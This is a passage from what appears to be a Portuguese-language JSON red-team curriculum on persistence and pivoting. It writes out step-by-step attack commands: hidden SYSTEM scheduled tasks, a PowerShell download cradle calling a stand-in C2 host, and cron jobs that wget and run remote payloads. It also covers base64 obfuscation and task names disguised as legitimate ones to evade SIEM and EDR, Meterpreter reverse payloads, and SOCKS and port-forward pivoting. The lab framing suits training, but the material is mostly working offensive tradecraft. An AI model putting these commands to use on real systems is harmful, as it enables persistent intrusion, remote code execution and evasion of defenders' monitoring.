                                  "subSteps": [
                                    "Estude a ajuda: 'schtasks /create /?' para entender parâmetros como /tn, /tr, /sc, /ru.",
                                    "Identifique parâmetros chave: /tn (nome), /tr (caminho executável), /sc ONLOGON (gatilho), /rl HIGHEST (nível).",
                                    "Teste sintaxe seca: 'schtasks /create /tn Teste /tr \"notepad.exe\" /sc once /st 00:00 /f' (força criação).",
                                    "Liste parâmetros para persistência: /sc minute (intervalo), /sc onlogon, /tr \"powershell.exe -file C:\\script.ps1\".",
                                    "Anote exemplos para C2: execução oculta com /ru SYSTEM."
                                  ],
                                  "verification": "Execute 'schtasks /?' e explique verbalmente 5 parâmetros principais sem consultar docs.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "CMD como admin",
                                    "Documentação Microsoft schtasks (offline PDF)"
                                  ],
                                  "tips": "Use aspas duplas em caminhos com espaços; /f sobrescreve tarefas existentes.",
                                  "learningObjective": "Compreender e memorizar sintaxe essencial para criação de tarefas personalizadas.",
                                  "commonMistakes": [
                                    "Omitir /f causando erro de tarefa existente",
                                    "Usar /sc inválido como 'daily' sem /d",
                                    "Esquecer privilégios para /ru SYSTEM"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Tarefa de Persistência ao Logon",
                                  "subSteps": [
                                    "Crie script payload simulado: 'echo \"Write-Output \\\"C2 Connected\\\" | Out-File C:\\c2.log\" > C:\\C2Test\\Persist.ps1'.",
                                    "Execute: 'schtasks /create /tn C2Persist /tr \"powershell.exe -WindowStyle Hidden -File C:\\C2Test\\Persist.ps1\" /sc onlogon /ru SYSTEM /rl HIGHEST /f'.",
                                    "Reinicie a VM e verifique log em C:\\c2.log após logon.",
                                    "Confirme visibilidade: 'schtasks /query /tn C2Persist /v /fo list'.",
                                    "Teste ocultação adicionando -WindowStyle Hidden no /tr."
                                  ],
                                  "verification": "Após reboot, arquivo C:\\c2.log existe e contém 'C2 Connected'; tarefa listada em Task Scheduler GUI.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Script PS1 de teste",
                                    "Task Scheduler GUI (taskschd.msc)"
                                  ],
                                  "tips": "Use /ru SYSTEM para execução sem interação do usuário; valide caminho absoluto no /tr.",
                                  "learningObjective": "Implementar persistência via gatilho de logon simulando conexão C2.",
                                  "commonMistakes": [
                                    "Caminho relativo no /tr (falha silenciosa)",
                                    "Sem /WindowStyle Hidden (janela visível)",
                                    "Política ExecutionPolicy bloqueando PS1 (use -ExecutionPolicy Bypass)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar Tarefa em Intervalos e Gerenciar Tarefas",
                                  "subSteps": [
                                    "Crie tarefa intervalada: 'schtasks /create /tn C2Interval /tr \"powershell.exe -File C:\\C2Test\\Persist.ps1\" /sc minute /mo 5 /ru SYSTEM /f'.",
                                    "Monitore execução: 'schtasks /query /tn C2Interval /v' e cheque logs múltiplas vezes.",
                                    "Gerencie: 'schtasks /run /tn C2Interval' para execução manual, '/change /tn C2Interval /ru CurrentUser' para alterar.",
                                    "Delete teste: 'schtasks /delete /tn C2Interval /f'; confirme com /query.",
                                    "Exporte para análise: 'schtasks /query /xml > tasks.xml'."
                                  ],
                                  "verification": "Tarefa executa a cada 5 min (ver logs), pode ser executada manualmente e deletada sem resíduos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Logs de execução (Event Viewer > Microsoft-Windows-TaskScheduler)"
                                  ],
                                  "tips": "Use /mo para modificar intervalos; monitore Event Viewer para falhas.",
                                  "learningObjective": "Configurar recorrência para C2 beaconing e dominar CRUD de tarefas.",
                                  "commonMistakes": [
                                    "Intervalo /mo muito baixo sobrecarregando sistema",
                                    "Falhar em deletar (/delete sem /f)",
                                    "Ignorar logs no Event Viewer"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar Persistência e Limpeza",
                                  "subSteps": [
                                    "Reinicie VM duas vezes e confirme execução de ambas tarefas via logs.",
                                    "Abra Task Scheduler GUI (taskschd.msc) e navegue para tarefas criadas.",
                                    "Analise eventos: Event Viewer > Applications and Services > Microsoft > Windows > TaskScheduler > Operational.",
                                    "Limpe: 'schtasks /delete /tn C2Persist /f /schtasks /delete /tn C2Interval /f'.",
                                    "Verifique detecção: Pesquise IOCs como nome da tarefa ou caminhos no sistema."
                                  ],
                                  "verification": "Nenhuma tarefa persiste após deleção; logs mostram execuções bem-sucedidas pré-limpeza.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Event Viewer",
                                    "Autoruns (Sysinternals) para checar persistência"
                                  ],
                                  "tips": "Use nomes de tarefas obfuscados em cenários reais; Autoruns detecta schtasks.",
                                  "learningObjective": "Validar eficácia da persistência e realizar limpeza forense.",
                                  "commonMistakes": [
                                    "Não reiniciar para testar logon",
                                    "Deixar tarefas rodando (detecção fácil)",
                                    "Ignorar GUI para validação visual"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, crie uma tarefa 'WindowsUpdateCheck' (/tn) que executa 'powershell.exe -WindowStyle Hidden -ep Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2-simulado.com/beacon.ps1')\"' (/tr) a cada 10 minutos (/sc minute /mo 10), garantindo beaconing C2 pós-reboot.",
                              "finalVerifications": [
                                "Tarefa criada lista corretamente via 'schtasks /query /v'.",
                                "Executa ao logon e em intervalos com logs confirmados.",
                                "Persiste reboot sem intervenção manual.",
                                "Executa como SYSTEM sem janela visível.",
                                "Pode ser gerenciada (run/change/delete) sem erros.",
                                "Limpeza remove completamente sem resíduos."
                              ],
                              "assessmentCriteria": [
                                "Sintaxe precisa sem erros de parâmetro (100% correto).",
                                "Persistência comprovada em pelo menos 2 reboots.",
                                "Execução oculta e com privilégios elevados.",
                                "Logs e eventos analisados corretamente.",
                                "Detecção e mitigação demonstradas (ex: via Autoruns).",
                                "Tempo total dentro de 1.5h com zero falhas críticas."
                              ],
                              "crossCurricularConnections": [
                                "PowerShell Scripting (SC-03): Criação e execução de payloads.",
                                "Windows Internals (OS-02): Entendimento de Task Scheduler e privilégios.",
                                "Redes e C2 (NET-05): Integração com beacons e download cradles.",
                                "Detecção Forense (DF-01): Análise de IOCs em logs e Autoruns.",
                                "Linux Equivalente (cron/at): Comparação cross-OS persistência."
                              ],
                              "realWorldApplication": "Em operações cibernéticas ofensivas (Red Team/Purple Team), schtasks estabelece persistência duradoura em endpoints Windows comprometidos, permitindo C2 beaconing contínuo apesar de reboots, patches ou hunts de EDR, comum em APTs como Cobalt Strike implants."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.2",
                            "name": "Persistência com Cron no Linux",
                            "description": "Editar o crontab para agendar jobs que baixam e executam payloads do servidor C2, garantindo persistência em ambientes Unix-like.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente Linux e Entender Cron",
                                  "subSteps": [
                                    "Instale uma VM Linux (ex: Ubuntu) em ambiente isolado.",
                                    "Execute 'crontab -l' para listar jobs atuais e 'man crontab' para revisar sintaxe.",
                                    "Crie um usuário não-root para simular compromissos reais: 'sudo adduser pentester'.",
                                    "Troque para o usuário: 'su - pentester' e verifique permissões de cron.",
                                    "Configure editor padrão: 'export EDITOR=nano'."
                                  ],
                                  "verification": "crontab -l mostra lista vazia ou jobs existentes; man crontab acessível.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VM Linux (Ubuntu/Debian)",
                                    "Acesso root inicial",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "Use ambiente isolado para evitar impactos reais.",
                                    "Sempre teste em VMs descartáveis."
                                  ],
                                  "learningObjective": "Compreender funcionamento e acesso ao crontab em Linux.",
                                  "commonMistakes": [
                                    "Executar como root desnecessariamente.",
                                    "Ignorar permissões de usuário."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver Script de Persistência para Download e Execução de Payload",
                                  "subSteps": [
                                    "Crie script /home/pentester/persist.sh: '#!/bin/bash\nwget -q http://c2.example.com/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh && rm /tmp/payload.sh'.",
                                    "Torne executável: 'chmod +x /home/pentester/persist.sh'.",
                                    "Adicione ofuscação: use base64 para codificar URL ou variáveis.",
                                    "Teste manual: './persist.sh' e verifique logs em /var/log/syslog.",
                                    "Adicione sleep ou condições para execução silenciosa."
                                  ],
                                  "verification": "Script executa sem erros e baixa/executa payload simulado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto (nano/vi)",
                                    "Servidor C2 simulado (ex: ngrok ou local http.server)",
                                    "Ferramentas: wget, bash"
                                  ],
                                  "tips": [
                                    "Simule C2 com Python: 'python3 -m http.server 80'.",
                                    "Evite payloads reais em labs."
                                  ],
                                  "learningObjective": "Criar scripts shell que garantam download e execução persistente de payloads.",
                                  "commonMistakes": [
                                    "URL hardcoded visível.",
                                    "Falta de limpeza de artefatos (/tmp/)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Editar Crontab para Agendar o Job de Persistência",
                                  "subSteps": [
                                    "Execute 'crontab -e' para abrir editor.",
                                    "Adicione linha: '*/5 * * * * /home/pentester/persist.sh' (a cada 5 min).",
                                    "Salve e saia; verifique com 'crontab -l'.",
                                    "Monitore logs: 'tail -f /var/log/syslog | grep CRON'.",
                                    "Teste job imediato alterando para '@reboot' temporariamente."
                                  ],
                                  "verification": "crontab -l lista o job corretamente; syslog mostra agendamentos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "crontab",
                                    "Editor configurado"
                                  ],
                                  "tips": [
                                    "Use *@reboot para persistência pós-boot.",
                                    "Frequências: */5 para testes, @hourly para produção."
                                  ],
                                  "learningObjective": "Configurar agendamentos cron precisos para execução recorrente.",
                                  "commonMistakes": [
                                    "Sintaxe errada (espaços em campos).",
                                    "Caminho absoluto ausente."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Execução e Monitorar Persistência",
                                  "subSteps": [
                                    "Aguarde ciclo cron ou force: 'run-parts /etc/cron.hourly' (adaptar).",
                                    "Verifique artefatos: ls /tmp/, logs de C2.",
                                    "Simule reboot: 'sudo reboot' e monitore pós-boot.",
                                    "Analise detecção: 'grep CRON /var/log/auth.log'.",
                                    "Otimize: adicione nohup ou & para background."
                                  ],
                                  "verification": "Job executa automaticamente; payload 'conecta' ao C2 simulado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Logs: /var/log/syslog, /var/log/cron",
                                    "Monitor de rede (tcpdump)"
                                  ],
                                  "tips": [
                                    "Use 'crontab -r' para remover jobs de teste.",
                                    "Monitore com 'ps aux | grep persist'."
                                  ],
                                  "learningObjective": "Validar funcionamento de jobs cron em cenários reais de persistência.",
                                  "commonMistakes": [
                                    "Ignorar logs de falha.",
                                    "Não testar pós-reboot."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Detecção e Limpeza",
                                  "subSteps": [
                                    "Liste jobs: 'crontab -l' e 'sudo crontab -l -u root'.",
                                    "Detecte anomalias: 'find /etc/cron* -type f -newer /home/pentester/persist.sh'.",
                                    "Remova: 'crontab -r'; apague scripts.",
                                    "Registre IOCs: jobs suspeitos, tráfego outbound.",
                                    "Documente relatório de persistência."
                                  ],
                                  "verification": "Todos jobs e artefatos removidos; sistema limpo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas de forensics: grep, find"
                                  ],
                                  "tips": [
                                    "Em defesa, monitore /var/spool/cron/crontabs.",
                                    "Automatize detecção com auditd."
                                  ],
                                  "learningObjective": "Identificar e mitigar técnicas de persistência via cron.",
                                  "commonMistakes": [
                                    "Deixar jobs órfãos.",
                                    "Não documentar IOCs."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um CTF de red teaming, comprometa uma VM Ubuntu como usuário 'www-data'. Crie persist.sh para wget http://seu-c2.ngrok.io/beacon.sh | bash, agende */10 * * * * no crontab do usuário. Após reboot, o beacon reporta ao C2 a cada 10 min, simulando APT persistence.",
                              "finalVerifications": [
                                "crontab -l exibe job corretamente agendado.",
                                "Script baixa e executa payload sem erros visíveis.",
                                "Persistência sobrevive a reboot da VM.",
                                "Logs mostram execução silenciosa sem alertas.",
                                "Conexão ao C2 simulado é estabelecida periodicamente.",
                                "Capacidade de detectar/remover o job manualmente."
                              ],
                              "assessmentCriteria": [
                                "Script usa caminhos absolutos e ofuscação básica.",
                                "Job roda em frequência não obvia (ex: não * * * * *).",
                                "Sem dependências externas falhas (ex: wget presente).",
                                "Limpeza automática de traces no script.",
                                "Relatório inclui IOCs e mitigações defensivas.",
                                "Execução em <5 min por ciclo completo."
                              ],
                              "crossCurricularConnections": [
                                "Administração Linux (gerenciamento de usuários/cron).",
                                "Scripting Bash (automação e ofuscação).",
                                "Redes e C2 (wget/curl, callbacks HTTP).",
                                "Segurança Defensiva (detecção de IOCs em logs).",
                                "Forensics Digital (análise de /var/log e crontabs)."
                              ],
                              "realWorldApplication": "Grupos APT como Lazarus ou APT41 usam cron jobs em servidores Linux comprometidos para baixar payloads de C2, executá-los e manter acesso stealth pós-reboot, evadindo detecções baseadas em processos efêmeros."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.3",
                            "name": "Evadir Detecção em Tarefas Agendadas",
                            "description": "Aplicar ofuscação em comandos agendados e usar nomes de tarefas legítimos para evitar alertas em ferramentas de monitoramento como SIEM.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Funcionamento de Tarefas Agendadas e Ferramentas de Monitoramento",
                                  "subSteps": [
                                    "Estude o agendador de tarefas do sistema operacional alvo (ex: Task Scheduler no Windows, cron no Linux).",
                                    "Analise logs gerados por SIEM como Splunk ou ELK Stack ao criar tarefas padrão.",
                                    "Identifique padrões de detecção comuns: nomes suspeitos, caminhos de executáveis maliciosos, frequência de execução.",
                                    "Revise regras de detecção em EDRs como CrowdStrike ou Microsoft Defender para tarefas agendadas.",
                                    "Documente comportamentos legítimos de tarefas em ambientes corporativos (ex: backups, atualizações)."
                                  ],
                                  "verification": "Crie uma tarefa de teste simples e verifique se ela aparece nos logs do SIEM sem alertas customizados.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação oficial do Task Scheduler/cron, acesso a um SIEM de teste (ex: Splunk Free), VM com Windows/Linux.",
                                  "tips": "Use VMs isoladas para evitar impactos em ambientes de produção.",
                                  "learningObjective": "Entender mecanismos de persistência via agendamento e pontos de detecção em ferramentas de segurança.",
                                  "commonMistakes": "Ignorar variações entre OS (Windows vs Linux), assumir que todos os SIEMs detectam da mesma forma."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar Nomes Legítimos e Projetar Ofuscação de Comandos",
                                  "subSteps": [
                                    "Pesquise tarefas comuns em empresas: 'WindowsUpdateCheck', 'SystemBackup', 'AVScan'.",
                                    "Crie nomes de tarefas que imitem essas (ex: 'DailySystemMaintenance').",
                                    "Ofusque o comando payload usando base64, PowerShell obfuscado ou argumentos indiretos (ex: schtasks /create /tn 'LegitTask' /tr 'powershell -enc <encoded>').",
                                    "Teste variações de caminhos: use %SystemRoot%\\System32 em vez de caminhos absolutos suspeitos.",
                                    "Incorpore delays ou condições (ex: /sc onlogon) para mimetizar tarefas reais."
                                  ],
                                  "verification": "Liste tarefas com 'schtasks /query' ou 'crontab -l' e confirme que o nome parece legítimo.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Ferramentas de ofuscação como Invoke-Obfuscation, lista de tarefas comuns de MITRE ATT&CK.",
                                  "tips": "Combine ofuscação em múltiplas camadas para resistir a decodificação automática.",
                                  "learningObjective": "Dominar técnicas de naming e ofuscação para mascarar payloads em agendamentos.",
                                  "commonMistakes": "Usar nomes muito genéricos que conflitam com tarefas reais, esquecer de ofuscar argumentos visíveis em logs."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Testar a Tarefa Agendada em Ambiente Controlado",
                                  "subSteps": [
                                    "Crie a tarefa via linha de comando: schtasks /create /tn 'MaintenanceTask' /tr 'cmd /c <obfuscated_payload>' /sc daily /st 02:00.",
                                    "Execute manualmente com 'schtasks /run /tn <nome>' e monitore execução.",
                                    "Verifique persistência após reboot e logs em Event Viewer (Windows) ou syslog (Linux).",
                                    "Simule detecção injetando a tarefa em uma VM com SIEM/EDR ativo.",
                                    "Ajuste parâmetros se alertas forem gerados (ex: mude horário para fora de horários peak)."
                                  ],
                                  "verification": "Confirme execução do payload sem alertas no SIEM e tarefa sobrevive a reboot.",
                                  "estimatedTime": "2 horas",
                                  "materials": "VM com EDR/SIEM instalado (ex: Defender + Splunk), scripts de payload benigno para teste.",
                                  "tips": "Use payloads inofensivos como 'ping google.com' inicialmente para depuração.",
                                  "learningObjective": "Aplicar criação de tarefas persistentes que evitam detecção inicial.",
                                  "commonMistakes": "Executar em horários que triggeram scans automatizados, não testar pós-reboot."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar, Ajustar e Validar Evasão de Detecção",
                                  "subSteps": [
                                    "Monitore logs por 24h após implantação para alertas latentes.",
                                    "Analise regras SIEM personalizadas e ajuste ofuscação (ex: evite strings como 'powershell').",
                                    "Teste remoção discreta: schtasks /delete /tn <nome> /f.",
                                    "Compare com baselines de tráfego normal usando Wireshark para C2 simulado.",
                                    "Documente lições aprendidas para iterações futuras em cenários de Red Team."
                                  ],
                                  "verification": "Sem alertas em SIEM após múltiplas execuções e reboot; tarefa não listada como suspeita em hunts manuais.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Ferramentas de monitoramento (Wireshark, Event Viewer), regras SIEM de exemplo.",
                                  "tips": "Automatize monitoramento com scripts para longo prazo.",
                                  "learningObjective": "Refinar técnicas baseadas em feedback de detecção real-time.",
                                  "commonMistakes": "Parar testes após sucesso inicial, ignorar detecções comportamentais."
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team, crie uma tarefa nomeada 'WindowsTelemetryUpdate' que executa um PowerShell obfuscado para beacon C2 a cada 4h, usando /tr 'powershell.exe -w hidden -enc <base64_payload>'. Teste em VM com Defender: tarefa roda sem alertas, persistindo pós-reboot.",
                              "finalVerifications": [
                                "Tarefa executa payload sem disparar alertas em SIEM/EDR.",
                                "Nome e argumentos não aparecem em buscas por IOCs comuns.",
                                "Persistência confirmada após reboot e logoff.",
                                "Logs mostram atividade como legítima (ex: similar a tarefas de update).",
                                "Remoção não gera alertas residuais.",
                                "Nenhum impacto detectável em monitoramento comportamental."
                              ],
                              "assessmentCriteria": [
                                "Precisão na ofuscação: payload decodificado manualmente mas não por ferramentas automáticas (80%+ sucesso).",
                                "Evasão de detecção: 0 alertas em 5 execuções simuladas.",
                                "Eficiência temporal: tarefa dentro de baseline de performance do sistema.",
                                "Documentação completa de steps e ajustes.",
                                "Criatividade em naming: imita 3+ tarefas reais corporativas.",
                                "Análise de falhas: identifica e mitiga 2+ pontos de detecção potenciais."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Ofuscação de scripts em PowerShell/Python.",
                                "Sistemas Operacionais: Gerenciamento avançado de schedulers (cron, at, Task Scheduler).",
                                "Análise de Logs: Parsing e hunting em SIEM/ELK.",
                                "Redes: Integração com C2 beacons para persistência.",
                                "Ética em Cibersegurança: Aplicação em Red Team/Blue Team exercises."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou análise de APTs (ex: grupos como APT29 usam scheduled tasks para persistência em ambientes Windows corporativos), permitindo simular ataques reais para treinar defesas, melhorar regras SIEM e validar EDRs sem detecção imediata."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.3",
                        "name": "Pivoting em Redes para Persistência",
                        "description": "Técnicas de pivoting para expandir o acesso de um host comprometido para outros na rede, mantendo canais C2 através de proxies e túneis.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.3.1",
                            "name": "Configurar Pivô com SOCKS Proxy",
                            "description": "Estabelecer um proxy SOCKS via Meterpreter ou SSH para rotear tráfego através de um host pivot, permitindo acesso persistente a segmentos internos da rede.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Obter Acesso Inicial ao Host Pivot",
                                  "subSteps": [
                                    "Identifique o host pivot comprometido via exploração prévia (ex: Meterpreter session ou SSH com credenciais roubadas).",
                                    "Inicie uma sessão Meterpreter no host pivot usando msfconsole: 'use exploit/multi/handler' e configure payload.",
                                    "Alternativamente, estabeleça conexão SSH: 'ssh user@target_ip -i private_key'.",
                                    "Verifique conectividade e privilégios: 'whoami', 'ifconfig' ou 'ip a'.",
                                    "Eleve privilégios se necessário usando técnicas como 'post/multi/manage/autoroute' no Meterpreter."
                                  ],
                                  "verification": "Sessão Meterpreter ativa ('sessions -l') ou prompt SSH responsivo com comandos básicos executados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "Chave SSH privada (se aplicável)",
                                    "Lab environment com VMs (Kali Linux, vítima pivot, rede interna)"
                                  ],
                                  "tips": "Use VPN ou lab isolado para evitar exposição real; priorize Meterpreter para funcionalidades avançadas.",
                                  "learningObjective": "Compreender como estabelecer foothold persistente em host pivot para pivoting.",
                                  "commonMistakes": [
                                    "Falhar em elevar privilégios",
                                    "Usar IPs errados",
                                    "Expor sessões sem tunneling"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar SOCKS Proxy no Host Pivot",
                                  "subSteps": [
                                    "No Meterpreter: Digite 'background' para voltar ao msfconsole, selecione sessão e execute 'run post/multi/manage/autoroute --session <ID>'.",
                                    "Inicie SOCKS proxy: 'use auxiliary/server/socks_proxy', configure 'LHOST 0.0.0.0', 'SRVPORT 1080' e 'run'.",
                                    "Para SSH: 'ssh -D 1080 -N user@target_ip' (dynamic forwarding).",
                                    "Confirme proxy rodando: 'netstat -tuln | grep 1080' no host pivot.",
                                    "Adicione rotas persistentes: 'autoroute -s <subnet_da_rede_interna>'.'"
                                  ],
                                  "verification": "Proxy SOCKS escutando na porta 1080 ('netstat' mostra LISTEN) e autoroutes listados ('autoroute -p').",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Metasploit com módulos post/multi/manage",
                                    "Ferramenta SSH client"
                                  ],
                                  "tips": "Use porta 1080 padrão para compatibilidade; teste com 'curl --socks5 localhost:1080 http://internal_ip'.",
                                  "learningObjective": "Dominar configuração de proxy SOCKS para forwarding dinâmico de tráfego.",
                                  "commonMistakes": [
                                    "Esquecer autoroutes",
                                    "Conflitos de porta",
                                    "Não backgroundar sessão Meterpreter"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Cliente Proxy no Atacante",
                                  "subSteps": [
                                    "Instale proxychains: 'apt install proxychains' no Kali.",
                                    "Edite /etc/proxychains.conf: adicione 'socks5 <pivot_ip> 1080' no final.",
                                    "Configure variáveis de ambiente: 'export http_proxy=socks5://<pivot_ip>:1080'.",
                                    "Teste com nmap: 'proxychains nmap -sT internal_target_ip'.",
                                    "Integre com ferramentas: 'proxychains msfconsole' para sessões adicionais."
                                  ],
                                  "verification": "Comando 'proxychains curl http://internal_ip' retorna resposta da rede interna sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Proxychains instalado",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": "Reinicie terminal após editar conf; use 'strict_chain' para debugging.",
                                  "learningObjective": "Aprender a rotear tráfego atacante através de proxy SOCKS para bypass de segmentação.",
                                  "commonMistakes": [
                                    "Sintaxe errada no proxychains.conf",
                                    "Usar IP local em vez de pivot",
                                    "Não exportar proxies"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Pivoting",
                                  "subSteps": [
                                    "Escaneie rede interna: 'proxychains nmap -sn 192.168.100.0/24'.",
                                    "Acesse serviço interno: 'proxychains nc internal_ip 445' ou 'proxychains smbclient //internal_ip/share'.",
                                    "Monitore tráfego: 'tcpdump -i any port 1080' no pivot.",
                                    "Teste persistência: Reinicie sessão e reconecte proxy.",
                                    "Documente logs: Capture saídas para relatório."
                                  ],
                                  "verification": "Acesso bem-sucedido a hosts internos invisíveis do atacante direto; tráfego roteado confirmado via tcpdump.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Nmap, nc, smbclient",
                                    "Tcpdump ou Wireshark"
                                  ],
                                  "tips": "Registre fingerprints de rede interna para análise; evite scans agressivos em labs.",
                                  "learningObjective": "Validar eficácia do pivô SOCKS em cenários de persistência C2.",
                                  "commonMistakes": [
                                    "Timeouts por scans lentos",
                                    "Firewall bloqueando proxy",
                                    "Não monitorar tráfego"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de red teaming com 3 VMs (Kali atacante, Windows pivot comprometido via EternalBlue, servidor interno Linux), configure SOCKS no pivot para escanear e explorar o servidor interno (porta 22) sem acesso direto da Kali.",
                              "finalVerifications": [
                                "SOCKS proxy ativo e escutando na porta 1080 no pivot.",
                                "Autoroutes configuradas e visíveis para sub-redes internas.",
                                "Proxychains roteia tráfego corretamente para hosts internos.",
                                "Nmap através de proxy descobre hosts e serviços ocultos.",
                                "Persistência mantida após reconexão da sessão.",
                                "Sem vazamento de tráfego direto para rede interna."
                              ],
                              "assessmentCriteria": [
                                "Configuração precisa do proxy sem erros de sintaxe (100% funcional).",
                                "Tempo total abaixo de 60 minutos com todas verificações passadas.",
                                "Demonstração de pivoting para pelo menos 2 hosts internos.",
                                "Documentação completa de comandos e saídas.",
                                "Identificação e mitigação de 2+ erros comuns.",
                                "Explicação clara de conceitos de forwarding SOCKS."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, forwarding e segmentação VLAN.",
                                "Sistemas Operacionais: Comandos Linux/Windows para netstat e roteamento.",
                                "Programação: Scripts em Python para automação de proxychains.",
                                "Ética em Segurança: Discussão de uso legal em CTFs e autorizações RoE."
                              ],
                              "realWorldApplication": "Em operações de Red Team autorizadas, pivôs SOCKS permitem acesso a DMZs ou segmentos OT isolados, simulando APTs para testar defesas de rede em exercícios de guerra cibernética."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.2",
                            "name": "Pivoting com Port Forwarding",
                            "description": "Usar portfwd no Meterpreter para encaminhar portas de hosts internos ao atacante, criando caminhos persistentes para C2 em redes segmentadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Laboratório Seguro",
                                  "subSteps": [
                                    "Configure três máquinas virtuais: Atacante (Kali Linux), Pivot (Windows/Linux comprometido) e Interna (alvo segmentado).",
                                    "Instale e configure Metasploit no atacante, garanta conectividade inicial apenas entre Atacante e Pivot.",
                                    "Verifique firewalls e regras de rede para simular segmentação (bloqueie tráfego direto Atacante-Interna).",
                                    "Inicie listener no atacante com msfconsole para payloads reversos.",
                                    "Documente IPs, portas e topologia de rede em um diagrama simples."
                                  ],
                                  "verification": "Ambiente pronto quando VMs inicializam sem erros e conectividade parcial é confirmada via ping/traceroute.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Kali Linux VM",
                                    "Windows/Linux Pivot VM",
                                    "Target Interna VM",
                                    "VirtualBox/VMware",
                                    "Metasploit Framework"
                                  ],
                                  "tips": "Use snapshots nas VMs para reset rápido após testes.",
                                  "learningObjective": "Entender a topologia de rede segmentada e preparar um lab isolado para pivoting seguro.",
                                  "commonMistakes": [
                                    "Esquecer de isolar a rede do lab da internet real",
                                    "Não configurar firewalls corretamente",
                                    "IPs conflitantes entre VMs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comprometer o Host Pivot e Obter Sessão Meterpreter",
                                  "subSteps": [
                                    "Gere um payload reverso TCP com msfvenom (ex: windows/meterpreter/reverse_tcp).",
                                    "Entregue o payload ao Pivot via phishing simulado ou exploit (ex: EternalBlue).",
                                    "Capture a sessão no msfconsole com 'use exploit/multi/handler'.",
                                    "Interaja com a sessão Meterpreter via 'sessions -i <ID>'.",
                                    "Execute comandos básicos: sysinfo, getuid, ipconfig/ifconfig para confirmar controle."
                                  ],
                                  "verification": "Sessão Meterpreter ativa e estável, com comandos respondendo corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "msfvenom",
                                    "msfconsole",
                                    "Payload gerado"
                                  ],
                                  "tips": "Use LHOST como IP do atacante e LPORT livre (ex: 4444).",
                                  "learningObjective": "Dominar geração e captura de payloads para acesso inicial em host pivot.",
                                  "commonMistakes": [
                                    "Payload incompatível com SO do pivot",
                                    "Firewall bloqueando conexão reversa",
                                    "Não migrar processo para estabilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Port Forwarding no Meterpreter",
                                  "subSteps": [
                                    "No Meterpreter, execute 'portfwd add -l <local_port> -p <remote_port> -r <internal_ip>'.",
                                    "Exemplo: portfwd add -l 8080 -p 445 -r 192.168.2.10 (forward 8080 local para 445 interna).",
                                    "Verifique com 'portfwd list' e teste conectividade local: nc -zv 127.0.0.1 <local_port>.",
                                    "Configure múltiplos forwards se necessário para C2 persistente.",
                                    "Monitore logs do Meterpreter para erros de binding."
                                  ],
                                  "verification": "'portfwd list' mostra entradas ativas e teste local com netcat succeeds.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
